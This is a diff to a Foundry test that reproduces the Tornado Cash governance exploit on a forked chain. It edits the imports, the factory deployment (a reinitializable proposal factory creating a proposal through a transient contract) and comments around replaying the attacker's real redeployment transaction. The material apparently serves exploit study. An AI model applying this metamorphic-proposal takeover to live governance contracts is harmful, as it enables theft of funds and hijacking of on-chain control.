@@ -8,7 +8,8 @@ import {IERC20} from "../../interfaces/IERC20.sol";
 import {IWETH9} from "../../interfaces/IWETH9.sol";
 import {Ownable} from "./AttackerOwnable.sol";
 import "./TornadoGovernance.interface.sol";
-import "./AttackerContracts.sol";
+import "./Attacker1Contracts.sol";
+import "./Attacker2Contracts.sol";
 
 contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
     uint256 forkIdBefore;
@@ -170,10 +171,11 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         // Deploy the factory
         proposalFactory = new ReinitializableContractFactory();
         console2.log("Proposal Factory deployed at: %s", address(proposalFactory));
+        vm.makePersistent(address(proposalFactory));
 
         // Deploy the proposal through a transient deploying the benign proposal
         (address proposal, address transient) =
-            proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), false, address(0));
+            proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), false);
 
         proposal_20 = Proposal_20(proposal);
         transientContract = TransientContract(transient);
@@ -191,7 +193,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
 
     // ======== REDEPLOY & PART II HELPERS ========
     function _redeployTransientAndProposal() internal {
-        // This is how a redeployment could look like
+        // // This is how a redeployment could look like
         // // Deploy the malicious proposal through a transient
         // (address proposal, address transient) =
         //     proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), true);
@@ -210,7 +212,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         // console2.log("Transient deployed at: %s", address(transientContract));
         // console2.log("Proposal 20 deployed at: %s", address(proposal_20));
 
-        // We call the actual attacker's contract showing the redeployment
+        // The actual attacker's contract showing the redeployment
         bytes32 redeployTx = 0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122;
         vm.transact(redeployTx);
     }
